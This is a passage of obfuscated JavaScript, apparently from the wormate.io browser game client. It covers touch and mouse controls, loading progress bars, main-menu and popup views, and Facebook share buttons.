            if (_0x207b06.mo == 5 && btoa(_0x2ec3e7) == _0x207b06.d_3 && _0x207b06.mo2.x == -1 && _0x207b06.mo2.y == -1) {
              _0x359a28.img_p_2.alpha = 1;
              _0x359a28.img_p_2.x = _0x122ef3;
              _0x359a28.img_p_2.y = _0xbc1d41;
              _0x359a28.img_p_2.visible = true;
            }
          } else if (_0x58da0e >= 2 && _0x207b06.mo2.x == -1 && _0x207b06.mo2.y == -1 && btoa(_0x2ec3e7) == _0x207b06.d_3 || _0x58da0e == 1 && _0x207b06.mo == 4 && _0x1fa6fa <= 40 && btoa(_0x1f5cd4) == _0x207b06.d_1 || _0x58da0e == 1 && _0x207b06.mo == 5 && _0x1fa6fa <= 40 && btoa(_0x571d21) == _0x207b06.d_2) {
            _0x207b06.mo2.y = _0x86b4f2;
            _0x359a28.img_f.visible = true;
            _0x359a28.img_pf_1.visible = true;
            if (_0x207b06.mo == 1) {
              _0x359a28.img_p_1.visible = false;
              _0x359a28.img_pf_1.x = _0x359a28.img_p_1.x;
              _0x359a28.img_pf_1.y = _0x359a28.img_p_1.y;
            }
            if (_0x207b06.mo == 2 || _0x207b06.mo == 4 || _0x207b06.mo == 5) {
              _0x359a28.img_p_2.visible = false;
              _0x359a28.img_pf_1.x = _0x359a28.img_p_2.x;
              _0x359a28.img_pf_1.y = _0x359a28.img_p_2.y;
            }
            if (_0x207b06.mo == 3 && btoa(_0x2ec3e7) == _0x207b06.d_3) {
              _0x359a28.img_p_3.visible = false;
              _0x359a28.img_pf_1.x = _0x359a28.img_p_3.x;
              _0x359a28.img_pf_1.y = _0x359a28.img_p_3.y;
            }
            if (_0x207b06.mo != 4 && _0x207b06.mo != 5) {
              _0x359a28.img_f.x = _0x141da2 - 100;
              _0x359a28.img_f.y = _0x3def82 - 100;
            }
            _0x87f727.eo = true;
          }
          ;
          _0x59f31b.preventDefault();
        } else {
          if (_0x59f31b = _0x59f31b || window.event) {
            _0x87f727.eo = _0x59f31b.touches.length >= 2;
          }
          _0x59f31b.preventDefault();
        }
      }, true);
      _0x119ef5.addEventListener("touchend", function (_0x49f030) {
        if (_0x5c2dcc.on && _0x207b06.mobile && _0x207b06.mo != 6 && _0x207b06.s) {
          var _0x4d80c9 = ooo.Xg.Kf.Wg.Ah;
          var _0x2b01fc = btoa(_0x207b06.c_1);
          if (_0x49f030 = _0x49f030 || window.event) {
            if ((_0x49f030 = _0x49f030.changedTouches[0]).clientX !== undefined) {
              _0x3b38a1(_0x49f030.clientX, _0x49f030.clientY);
            } else {
              _0x3b38a1(_0x49f030.pageX, _0x49f030.pageY);
            }
          }
          var _0x3dd42e = btoa(_0x207b06.c_2);
          var _0x4794a8 = _0x49f030.identifier;
          if (_0x4794a8 == _0x207b06.mo1.x && _0x207b06.mo1.y == -1 && btoa(_0x3dd42e) == _0x207b06.d_2) {
            _0x207b06.mo1.x = -1;
            if (_0x207b06.mo == 1) {
              _0x4d80c9.img_p_1.alpha = 0.25;
            }
            if (_0x207b06.mo == 2) {
              _0x4d80c9.img_o_2.alpha = 0.25;
              _0x4d80c9.img_i_2.alpha = 0.25;
              _0x4d80c9.img_p_2.alpha = 0.25;
            }
            if (_0x207b06.mo == 3 && btoa(_0x2b01fc) == _0x207b06.d_1) {
              _0x4d80c9.img_o_3.alpha = 0.25;
              _0x4d80c9.img_i_3.alpha = 0.25;
              _0x4d80c9.img_p_3.alpha = 0.25;
            }
            if (_0x207b06.mo == 4) {
              _0x4d80c9.img_p_2.alpha = 0.25;
            }
            if (_0x207b06.mo == 5) {
              _0x4d80c9.img_p_2.alpha = 0.25;
            }
          }
          var _0x43ce1a = btoa(_0x207b06.c_3);
          if (_0x207b06.mo2.x == -1 && _0x4794a8 == _0x207b06.mo2.y && btoa(_0x43ce1a) == _0x207b06.d_3) {
            _0x207b06.mo2.y = -1;
            _0x4d80c9.img_f.visible = false;
            _0x4d80c9.img_pf_1.visible = false;
            if (_0x207b06.mo == 1) {
              _0x4d80c9.img_p_1.visible = true;
            }
            if (_0x207b06.mo == 2 || _0x207b06.mo == 4 && btoa(_0x3dd42e) == _0x207b06.d_2 || _0x207b06.mo == 5 && btoa(_0x43ce1a) == _0x207b06.d_3) {
              _0x4d80c9.img_p_2.visible = true;
            }
            if (_0x207b06.mo == 3) {
              _0x4d80c9.img_p_3.visible = true;
            }
            if (_0x207b06.mo == 4 || _0x207b06.mo == 5) {
              _0x4d80c9.img_f.visible = true;
            }
            _0x87f727.eo = false;
          }
        } else {
          if (_0x49f030 = _0x49f030 || window.event) {
            _0x87f727.eo = _0x49f030.touches.length >= 2;
          }
          if (_0x207b06.mobile && _0x207b06.s && (_0x49f030 = _0x49f030 || window.event)) {
            if ((_0x49f030 = _0x49f030.changedTouches[0]).clientX !== undefined) {
              _0x3b38a1(_0x49f030.clientX, _0x49f030.clientY);
            } else {
              _0x3b38a1(_0x49f030.pageX, _0x49f030.pageY);
            }
          }
        }
      }, true);
      _0x119ef5.addEventListener("mousemove", function (_0x159aa3) {
        if (_0x159aa3 = _0x159aa3 || _0x7f096e.c.event && _typeof(_0x159aa3.clientX) != "undefined") {
          _0x87f727.fo = _0x331039.ta(_0x159aa3.clientY - _0x119ef5.offsetHeight * 0.5, _0x159aa3.clientX - _0x119ef5.offsetWidth * 0.5);
        }
      }, true);
      _0x119ef5.addEventListener("mousedown", function (_0x19aa65) {
        _0x87f727.eo = true;
      }, true);
      _0x119ef5.addEventListener("mouseup", function (_0xb26ed1) {
        _0x87f727.eo = false;
      }, true);
      this.Wg = new _0x7f096e.lh(_0x2b23a9);
      this.go = _0x3683b2.ho;
      this.fo = 0;
      this.eo = false;
      _0x5c2dcc.eie = _0x87f727;
    })).prototype.Sa = function () {};
    _0x3eadc8.prototype.ml = function () {
      _0x7f096e.Nf.rg(false);
      _0x4ead11.f.h(_0x7f096e.Uf.Tf, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Qn, 1);
      _0x4ead11.f.h(_0x7f096e.Uf.Rn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Sn, 50);
      _0x4ead11.f.g(_0x7f096e.Uf.Tn, 500);
      if (this.go === _0x3683b2.ho) {
        _0x4ead11.f.h(_0x7f096e.Uf.Un, 1);
      } else {
        _0x4ead11.f.g(_0x7f096e.Uf.Un, 500);
      }
      _0x4ead11.f.h(_0x7f096e.Uf.Vn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Wn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Xn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Yn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Zn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.$n, 50);
      _0x4ead11.f.h(_0x7f096e.Uf._n, 50);
    };
    _0x3eadc8.prototype.ho = function () {
      this.go = _0x3683b2.ho;
      return this;
    };
    _0x3eadc8.prototype.io = function () {
      _0x4ead11.f.h(_0x19b2c7, 1);
      _0x331039.Y(function () {
        _0x4ead11.f.g(_0x19b2c7, 500);
      }, 3000);
      _0x4ead11.f.h(_0x27fb3f, 1);
      _0x331039.Y(function () {
        _0x4ead11.f.g(_0x27fb3f, 500);
      }, 500);
      this.go = _0x3683b2.io;
      return this;
    };
    _0x3eadc8.prototype.nl = function () {
      this.eo = false;
      this.Wg.qg();
      if (this.go === _0x3683b2.io) {
        ooo.ij.mf();
      }
    };
    _0x3eadc8.prototype.qg = function () {
      this.Wg.qg();
    };
    _0x3eadc8.prototype.ug = function (_0xe16341, _0x29b348) {
      this.Wg.ug(_0xe16341, _0x29b348);
    };
    _0x3eadc8.prototype.jo = function (_0x2c1173, _0x5959ee, _0x4fba12) {
      var _0x3a72c2;
      var _0x395329;
      var _0x3b0db7;
      if (_0x5959ee >= 1 && _0x5959ee <= 10) {
        _0x3a72c2 = _0x331039.U("index.game.result.place.i" + _0x5959ee);
        _0x395329 = _0x331039.U("index.game.result.placeInBoard");
        _0x3b0db7 = _0x331039.U("index.game.social.shareResult.messGood").replace("{0}", _0x4fba12).replace("{1}", _0x2c1173).replace("{2}", _0x3a72c2);
      } else {
        _0x3a72c2 = "";
        _0x395329 = _0x331039.U("index.game.result.tryHit");
        _0x3b0db7 = _0x331039.U("index.game.social.shareResult.messNorm").replace("{0}", _0x4fba12).replace("{1}", _0x2c1173);
      }
      _0x3c4a57.html(_0x331039.U("index.game.result.your"));
      _0xba08.html(_0x2c1173);
      _0x1250ad.html(_0x3a72c2);
      _0x3fb489.html(_0x395329);
      if (_0x494ea6.co.bo) {
        var _0x13609e;
        var _0x2e3f99;
        var _0x54af3b;
        var _0x5106f4;
        var _0x1d156c;
        var _0xec122c;
        var _0x542efa;
        var _0x42f2d3 = _0x331039.U("index.game.result.share");
        _0x331039.U("index.game.social.shareResult.caption");
        _0x2e5d67.empty().append((_0x13609e = _0x42f2d3, _0x2e3f99 = "https://wormate.io", _0x54af3b = "wormate.io", _0x5106f4 = _0x3b0db7, _0x1d156c = _0x3b0db7, _0xec122c = "https://wormate.io/images/og-share-img-new.jpg", (_0x542efa = $("<div><svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" x=\"0\" y=\"0\" viewBox=\"0 0 456 456\" xml: space=\"preserve\"><rect x=\"0\" y=\"0\" width=\"456\" height=\"456\" fill=\"#517AD1\"/><path d=\"M242.7 456V279.7h-59.3v-71.9h59.3v-60.4c0-43.9 35.6-79.5 79.5-79.5h62v64.6h-44.4c-13.9 0-25.3 11.3-25.3 25.3v50h68.5l-9.5 71.9h-59.1V456z\" fill=\"#fff\"/></svg><span>" + _0x13609e + "</span></div>")).click(function () {
          if ((typeof FB == "undefined" ? "undefined" : _typeof(FB)) !== "undefined" && _typeof(FB.ui) != "undefined") {
            FB.ui({
              method: "feed",
              display: "popup",
              link: _0x2e3f99,
              name: _0x54af3b,
              caption: _0x5106f4,
              description: _0x1d156c,
              picture: _0xec122c
            }, function () {});
          }
        }), _0x542efa));
      }
    };
    _0x3eadc8.prototype.ko = function () {
      return this.fo;
    };
    _0x3eadc8.prototype.lo = function () {
      return this.eo;
    };
    _0x3683b2 = {
      ho: 0,
      io: 1
    };
    _0x7f096e.Bk = _0x3eadc8;
    _0x47e4a7 = $("#loading-progress-cont");
    _0x5ce594 = $("#loading-progress-bar");
    _0xdf3a6d = $("#loading-progress-text");
    (_0x5f433f = _0x331039.ca(_0x7f096e.Uf, function () {
      _0x7f096e.Uf.call(this, _0x7f096e.ll.ao);
      this.mo = -1;
      this.no = "";
    })).prototype.Sa = function () {};
    _0x5f433f.prototype.ml = function () {
      _0x7f096e.Nf.rg(true);
      _0x4ead11.f.g(_0x7f096e.Uf.Tf, 500);
      _0x4ead11.f.g(_0x7f096e.Uf.Qn, 1);
      _0x4ead11.f.h(_0x7f096e.Uf.Rn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Sn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Tn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Un, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Vn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Wn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Xn, 50);
      _0x4ead11.f.g(_0x7f096e.Uf.Yn, 500);
      _0x4ead11.f.h(_0x7f096e.Uf.Zn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.$n, 50);
      _0x4ead11.f.h(_0x7f096e.Uf._n, 50);
    };
    _0x5f433f.prototype.nl = function () {
      ooo.ij.Ye(_0x7f096e.Pe.Se.Re);
      ooo.Xg.Ak.wg();
      ooo.Xg.Ak.sg(true);
    };
    _0x5f433f.prototype.hl = function () {
      ooo.Xg.Ak.sg(false);
    };
    _0x5f433f.prototype.oo = function () {
      this.po("", 0);
      _0x4ead11.f.g(_0x47e4a7, 100);
    };
    _0x5f433f.prototype.qo = function () {
      _0x4ead11.f.h(_0x47e4a7, 100);
    };
    _0x5f433f.prototype.po = function (_0x57d787, _0x2cf63d) {
      if (this.no !== _0x57d787) {
        this.no = _0x57d787;
      }
      var _0x4d56c3 = _0x331039.fa(_0x331039._(_0x2cf63d * 100), 0, 100);
      if (this.mo !== _0x4d56c3) {
        _0x5ce594.css("width", _0x4d56c3 + "%");
        _0xdf3a6d.html(_0x4d56c3 + " %");
      }
    };
    _0x7f096e.$k = _0x5f433f;
    _0x1bbfd8 = $("#mm-line-top");
    $("#mm-line-center");
    $("#mm-line-bottom");
    _0x239ef0 = $("#mm-bottom-buttons");
    _0x5ae1c3 = $("#mm-menu-cont");
    _0xf42f2c = $("#mm-loading");
    _0x17bb0b = $("#mm-loading-progress-bar");
    _0x5129ef = $("#mm-loading-progress-text");
    $("#mm-event-text");
    _0x1b6ac5 = $("#mm-skin-canv");
    _0x37dc9e = $("#mm-skin-prev");
    _0x2406ac = $("#mm-skin-next");
    _0x5e5a76 = $("#mm-skin-over");
    _0xe04f01 = $("#mm-skin-over-button-list");
    _0x188ce8 = $("#mm-params-nickname");
    _0x2ad8a7 = $("#mm-params-game-mode");
    _0x562bc9 = $("#mm-action-play");
    _0x37aca5 = $("#mm-action-guest");
    _0x2101e3 = $("#mm-action-login");
    _0x2143f0 = $("#mm-player-info");
    _0x58be33 = $("#mm-store");
    _0x370119 = $("#mm-leaders");
    _0x11dbbb = $("#mm-settings");
    _0x130328 = $("#mm-coins-box");
    _0xc02acb = $("#mm-player-avatar");
    _0x599f60 = $("#mm-player-username");
    _0x3a93d9 = $("#mm-coins-val");
    _0xbf6ba9 = $("#mm-player-exp-bar");
    _0x3cc727 = $("#mm-player-exp-val");
    _0x1a3173 = $("#mm-player-level");
    (_0x5747f9 = _0x331039.ca(_0x7f096e.Uf, function () {
      _0x7f096e.Uf.call(this, _0x7f096e.ll.kl);
      this.mo = -1;
      this.no = "";
      this.ro = new _0x7f096e.Lm(_0x1b6ac5);
      _0x2ad8a7.click(function () {
        ooo.ij.if();
      });
      _0x1b6ac5.click(function () {
        if (ooo.ok.nk()) {
          ooo.ij.if();
          ooo.Xg.gl(ooo.Xg.Qk);
        }
      });
      _0x37dc9e.click(function () {
        ooo.ij.if();
        ooo.so.kk();
      });
      _0x2406ac.click(function () {
        ooo.ij.if();
        ooo.so.jk();
      });
      _0x188ce8.keypress(function (_0x228171) {
        _0x207b06.r1 = false;
        if (_0x228171.keyCode === 13) {
          ooo.to();
        }
      });
      _0x562bc9.click(function () {
        ooo.ij.if();
        ooo.to();
      });
      _0x37aca5.click(function () {
        ooo.ij.if();
        ooo.to();
      });
      _0x2101e3.click(function () {
        ooo.ij.if();
        ooo.Xg.gl(ooo.Xg.Nk);
      });
      _0x11dbbb.click(function () {
        ooo.ij.if();
        ooo.Xg.gl(ooo.Xg.Hi);
      });
      _0x2143f0.click(function () {
        if (ooo.ok.nk()) {
          ooo.ij.if();
          ooo.Xg.gl(ooo.Xg.Lk);
        }
      });
      _0x370119.click(function () {
        if (ooo.ok.nk()) {
          ooo.ij.if();
          ooo.Xg.gl(ooo.Xg.Jk);
        }
      });
      _0x58be33.click(function () {
        if (ooo.ok.nk()) {
          ooo.ij.if();
          ooo.Xg.gl(ooo.Xg.Sk);
        }
      });
      _0x130328.click(function () {
        if (ooo.ok.nk()) {
          ooo.ij.if();
          ooo.Xg.gl(ooo.Xg.Hk);
        }
      });
      this.uo();
      this.vo();
      var _0x2ebdf8 = _0x7f096e.Cg.Og(_0x7f096e.Cg.Ig);
      if (_0x2ebdf8 !== "ARENA" && _0x2ebdf8 !== "TEAM2") {
        _0x2ebdf8 = "ARENA";
      }
      _0x2ad8a7.val(_0x2ebdf8);
    })).prototype.Sa = function () {
      var _0x8699d4 = this;
      function _0x41a89c(_0x1295ae, _0xfa900a) {
        if (_0x1295ae.pm) {
          _0xfa900a.skinId = _0x1295ae.pm.Tj;
          _0xfa900a.eyesId = _0x1295ae.pm.Uj;
          _0xfa900a.mouthId = _0x1295ae.pm.Vj;
          _0xfa900a.hatId = _0x1295ae.pm.Wj;
          _0xfa900a.glassesId = _0x1295ae.pm.Xj;
        }
      }
      ooo.ok.fm(function () {
        if (ooo.ok.nk()) {
          _0x41a89c(_0x207b06, ooo.ok.xl);
          ooo.so.lk(ooo.ok.Ul(), _0x7f096e._j.$j);
          ooo.so.lk(ooo.ok.Vl(), _0x7f096e._j.ak);
          ooo.so.lk(ooo.ok.Wl(), _0x7f096e._j.bk);
          ooo.so.lk(ooo.ok.Xl(), _0x7f096e._j.dk);
          ooo.so.lk(ooo.ok.Yl(), _0x7f096e._j.ck);
        } else {
          ooo.so.lk(ooo.wo(), _0x7f096e._j.$j);
          ooo.so.lk(0, _0x7f096e._j.ak);
          ooo.so.lk(0, _0x7f096e._j.bk);
          ooo.so.lk(0, _0x7f096e._j.dk);
          ooo.so.lk(0, _0x7f096e._j.ck);
        }
      });
      ooo.ok.fm(function () {
        _0x562bc9.toggle(ooo.ok.nk());
        _0x2101e3.toggle(!ooo.ok.nk());
        _0x37aca5.toggle(!ooo.ok.nk());
        _0x370119.toggle(ooo.ok.nk());
        _0x58be33.toggle(ooo.ok.nk());
        _0x130328.toggle(ooo.ok.nk());
        _0x2143f0.toggle(true);
        _0x11dbbb.toggle(true);
        if (ooo.ok.nk()) {
          _0x5e5a76.hide();
          _0x599f60.html(ooo.ok.Ll());
          _0xc02acb.attr("src", ooo.ok.Nl());
          _0x3a93d9.html(ooo.ok.Ql());
          _0xbf6ba9.width(ooo.ok.Sl() * 100 / ooo.ok.Tl() + "%");
          _0x3cc727.html(ooo.ok.Sl() + " / " + ooo.ok.Tl());
          _0x1a3173.html(ooo.ok.Rl());
          _0x188ce8.val(ooo.ok.Ml());
        } else {
          _0x5e5a76.toggle(_0x494ea6.co.bo && !ooo.xo());
          _0x599f60.html(_0x599f60.data("guest"));
          _0xc02acb.attr("src", _0x494ea6.H.M);
          _0x3a93d9.html("10");
          _0xbf6ba9.width("0");
          _0x3cc727.html("");
          _0x1a3173.html(1);
          _0x188ce8.val(_0x7f096e.Cg.Og(_0x7f096e.Cg.Jg));
        }
      });
      ooo.so.fk(function () {
        _0x8699d4.ro.Gm(ooo.so.ek());
      });
    };
    _0x5747f9.prototype.ml = function () {
      _0x7f096e.Nf.rg(true);
      _0x4ead11.f.g(_0x7f096e.Uf.Tf, 500);
      _0x4ead11.f.g(_0x7f096e.Uf.Qn, 1);
      _0x4ead11.f.g(_0x7f096e.Uf.Rn, 500);
      _0x4ead11.f.g(_0x7f096e.Uf.Sn, 500);
      _0x4ead11.f.h(_0x7f096e.Uf.Tn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Un, 50);
      _0x4ead11.f.g(_0x7f096e.Uf.Vn, 500);
      _0x4ead11.f.h(_0x7f096e.Uf.Wn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Xn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Yn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Zn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.$n, 50);
      _0x4ead11.f.h(_0x7f096e.Uf._n, 50);
    };
    _0x5747f9.prototype.yo = function () {
      _0x4ead11.f.g(_0x1bbfd8, 500);
      _0x4ead11.f.g(_0x239ef0, 500);
      _0x4ead11.f.g(_0x5ae1c3, 500);
      _0x4ead11.f.h(_0xf42f2c, 100);
    };
    _0x5747f9.prototype.zo = function () {
      _0x4ead11.f.h(_0x1bbfd8, 100);
      _0x4ead11.f.h(_0x239ef0, 100);
      _0x4ead11.f.h(_0x5ae1c3, 100);
      _0x4ead11.f.g(_0xf42f2c, 500);
    };
    _0x5747f9.prototype.po = function (_0x16e1a2, _0x6cc2a1) {
      if (this.no !== _0x16e1a2) {
        this.no = _0x16e1a2;
      }
      var _0x1c41f7 = _0x331039.fa(_0x331039._(_0x6cc2a1 * 100), 0, 100);
      if (this.mo !== _0x1c41f7) {
        _0x17bb0b.css("width", _0x1c41f7 + "%");
        _0x5129ef.html(_0x1c41f7 + " %");
      }
    };
    _0x5747f9.prototype.nl = function () {
      ooo.ij.jf();
      this.ro.rg(true);
    };
    _0x5747f9.prototype.hl = function () {
      this.ro.rg(false);
    };
    _0x5747f9.prototype.qg = function () {
      this.ro.qg();
    };
    _0x5747f9.prototype.ug = function (_0x2e3906, _0x2da1e3) {
      this.ro.ug();
    };
    _0x5747f9.prototype.Ml = function () {
      return _0x188ce8.val();
    };
    _0x5747f9.prototype.Ao = function () {
      return _0x2ad8a7.val();
    };
    _0x5747f9.prototype.uo = function () {
      var _0x2b4864 = $("#mm-advice-cont").children();
      var _0x2baad5 = 0;
      _0x331039.X(function () {
        _0x2b4864.eq(_0x2baad5).fadeOut(500, function () {
          if (++_0x2baad5 >= _0x2b4864.length) {
            _0x2baad5 = 0;
          }
          _0x2b4864.eq(_0x2baad5).fadeIn(500).css("display", "inline-block");
        });
      }, 3000);
    };
    _0x5747f9.prototype.vo = function () {
      if (_0x494ea6.co.bo && !ooo.xo()) {
        _0x5e5a76.show();
        var _0x73a27 = _0x331039.U("index.game.main.menu.unlockSkins.share");
        var _0x356063 = encodeURIComponent(_0x331039.U("index.game.main.menu.unlockSkins.comeAndPlay"));
        _0xe04f01.append($("<a class=\"mm-skin-over-button\" id=\"mm-skin-over-fb\" target=\"_blank\" href=\"https://www.facebook.com/dialog/share?app_id=861926850619051&display=popup&href=https%3A%2F%2Fwormate.io&redirect_uri=https%3A%2F%2Fwormate.io&hashtag=%23wormateio&quote=" + _0x356063 + "\"><img src=\"data: image/svg+xml; base64, PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSIgeD0iMCIgeT0iMCIgdmlld0JveD0iMCAwIDQ1NiA0NTYiIHhtbDpzcGFjZT0icHJlc2VydmUiPjxwYXRoIGQ9Ik0yNDQuMyA0NTZWMjc5LjdoLTU5LjN2LTcxLjloNTkuM3YtNjAuNGMwLTQzLjkgMzUuNi03OS41IDc5LjUtNzkuNWg2MnY2NC42aC00NC40Yy0xMy45IDAtMjUuMyAxMS4zLTI1LjMgMjUuM3Y1MGg2OC41bC05LjUgNzEuOWgtNTkuMVY0NTZ6IiBmaWxsPSIjZmZmIi8+PC9zdmc+\"/><span>" + _0x73a27 + "</span></a>").click(function _0x14d834() {
          ooo.Bo(true);
          _0x331039.Y(function () {
            _0x5e5a76.hide();
          }, 3000);
        }));
      }
    };
    _0x7f096e.Ck = _0x5747f9;
    (_0x5c899d = _0x331039.ca(_0x7f096e.Uf, function () {
      _0x7f096e.Uf.call(this, _0x7f096e.ll.ao);
    })).prototype.Sa = function () {};
    _0x5c899d.prototype.ml = function () {
      _0x7f096e.Nf.rg(true);
      _0x4ead11.f.h(_0x7f096e.Uf.Tf, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Qn, 1);
      _0x4ead11.f.h(_0x7f096e.Uf.Rn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Sn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Tn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Un, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Vn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Wn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Xn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Yn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Zn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.$n, 50);
      _0x4ead11.f.h(_0x7f096e.Uf._n, 50);
    };
    _0x7f096e.el = _0x5c899d;
    (_0x425fb5 = _0x331039.ca(_0x7f096e.Uf, function () {
      _0x7f096e.Uf.call(this, _0x7f096e.ll.ao);
    })).prototype.Sa = function () {};
    _0x425fb5.prototype.ml = function () {
      _0x7f096e.Nf.rg(true);
      _0x4ead11.f.g(_0x7f096e.Uf.Tf, 500);
      _0x4ead11.f.g(_0x7f096e.Uf.Qn, 1);
      _0x4ead11.f.h(_0x7f096e.Uf.Rn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Sn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Tn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Un, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Vn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Wn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Xn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Yn, 50);
      _0x4ead11.f.g(_0x7f096e.Uf.Zn, 500);
      _0x4ead11.f.h(_0x7f096e.Uf.$n, 50);
      _0x4ead11.f.h(_0x7f096e.Uf._n, 50);
    };
    _0x425fb5.prototype.nl = function () {};
    _0x7f096e.Xk = _0x425fb5;
    _0x1993b5 = $("#toaster-stack");
    (_0x17d6ca = _0x331039.ca(_0x7f096e.Uf, function () {
      _0x7f096e.Uf.call(this, _0x7f096e.ll.ao);
      this.Co = [];
      this.Do = null;
    })).prototype.Sa = function () {};
    _0x17d6ca.prototype.ml = function () {
      _0x7f096e.Nf.rg(true);
      _0x4ead11.f.g(_0x7f096e.Uf.Tf, 500);
      _0x4ead11.f.g(_0x7f096e.Uf.Qn, 1);
      _0x4ead11.f.h(_0x7f096e.Uf.Rn, 50);
      _0x4ead11.f.g(_0x7f096e.Uf.Sn, 500);
      _0x4ead11.f.h(_0x7f096e.Uf.Tn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Un, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Vn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Wn, 50);
      _0x4ead11.f.g(_0x7f096e.Uf.Xn, 500);
      _0x4ead11.f.h(_0x7f096e.Uf.Yn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.Zn, 50);
      _0x4ead11.f.h(_0x7f096e.Uf.$n, 50);
      _0x4ead11.f.h(_0x7f096e.Uf._n, 50);
    };
    _0x17d6ca.prototype.nl = function () {
      this.Eo();
    };
    _0x17d6ca.prototype.ql = function () {
      return this.Do != null || this.Co.length > 0;
    };
    _0x17d6ca.prototype.Fo = function (_0x22df7a) {
      this.Co.unshift(_0x22df7a);
      _0x331039.Y(function () {
        ooo.Xg.ol();
      }, 0);
    };
    _0x17d6ca.prototype.km = function (_0x1b8cc1) {
      this.Co.push(_0x1b8cc1);
      _0x331039.Y(function () {
        ooo.Xg.ol();
      }, 0);
    };
    _0x17d6ca.prototype.Eo = function () {
      var _0x5a48d4 = this;
      if (this.Do == null) {
        if (this.Co.length === 0) {
          ooo.Xg.jl();
          return;
        }
        ;
        var _0x11c206 = this.Co.shift();
        this.Do = _0x11c206;
        var _0x2b019e = _0x11c206.ag();
        _0x4ead11.f.g(_0x2b019e, 300);
        _0x1993b5.append(_0x2b019e);
        _0x11c206.Go = function () {
          _0x2b019e.fadeOut(300);
          _0x331039.Y(function () {
            _0x2b019e.remove();
          }, 300);
          if (_0x5a48d4.Do === _0x11c206) {
            _0x5a48d4.Do = null;
          }
          _0x5a48d4.Eo();
        };
        _0x11c206.nl();
      }
    };
    _0x7f096e.Zk = _0x17d6ca;
    _0x7f096e.ll = {
      ao: 0,
      kl: 1
    };
    _0x34f625 = $("#popup-menu-label");
    _0x5c0006 = $("#popup-menu-coins-box");
    _0x3302a7 = $("#popup-menu-coins-val");
    $("#popup-menu-back").click(function () {
      ooo.ij.if();
      ooo.Xg.jl();
    });
    _0x5c0006.click(function () {
      if (ooo.ok.nk()) {
        ooo.ij.if();
        ooo.Xg.gl(ooo.Xg.Hk);
      }
    });
    (_0x248a9a = _0x331039.ca(_0x7f096e.Uf, function (_0x152bdc, _0x1891a5) {
      _0x7f096e.Uf.call(this, _0x7f096e.ll.kl);
      this.Xa = _0x152bdc;
      this.Io = _0x1891a5;
      this.Jo = [];
    })).prototype.Sa = function () {
      _0x248a9a.parent.prototype.Sa.call(this);
      if (!_0x248a9a.Ko) {
        _0x248a9a.Ko = true;
        ooo.ok.fm(function () {
          if (ooo.ok.nk()) {
            _0x3302a7.html(ooo.ok.Ql());
          } else {
            _0x3302a7.html("0");
          }
        });
      }
      _0x4ead11.f.h(_0x7f096e.Ho.Lo, 100);
    };
    _0x248a9a.Mo = $("#coins-view");
    _0x248a9a.No = $("#leaders-view");
    _0x248a9a.Oo = $("#profile-view");
    _0x248a9a.Po = $("#login-view");
    _0x248a9a.Qo = $("#settings-view");
    _0x248a9a.Ro = $("#skins-view");
    _0x248a9a.So = $("#store-view");
    _0x248a9a.To = $("#wear-view");
    _0x248a9a.Uo = $("#withdraw-consent-view");
    _0x248a9a.Vo = $("#delete-account-view");
    _0x248a9a.Lo = $("#please-wait-view");
    _0x248a9a.prototype.ml = function () {
      _0x7f096e.Nf.rg(true);
      _0x4ead11.f.g(_0x7f096e.Uf.Tf, 1);
      _0x4ead11.f.g(_0x7f096e.Uf.Qn, 500);
      _0x4ead11.f.g(_0x7f096e.Uf.Rn, 200);
      _0x4ead11.f.g(_0x7f096e.Uf.Sn, 200);
      _0x4ead11.f.h(_0x7f096e.Uf.Tn, 200);
      _0x4ead11.f.h(_0x7f096e.Uf.Un, 200);
      _0x4ead11.f.h(_0x7f096e.Uf.Vn, 200);
      _0x4ead11.f.g(_0x7f096e.Uf.Wn, 200);
      _0x4ead11.f.h(_0x7f096e.Uf.Xn, 200);
      _0x4ead11.f.h(_0x7f096e.Uf.Yn, 200);
      _0x4ead11.f.h(_0x7f096e.Uf.Zn, 200);
      _0x4ead11.f.h(_0x7f096e.Uf.$n, 200);
      _0x4ead11.f.h(_0x7f096e.Uf._n, 200);
      _0x34f625.html(this.Xa);
      _0x5c0006.toggle(this.Io);
      this.Wo();
    };
    _0x248a9a.prototype.Wo = function () {};
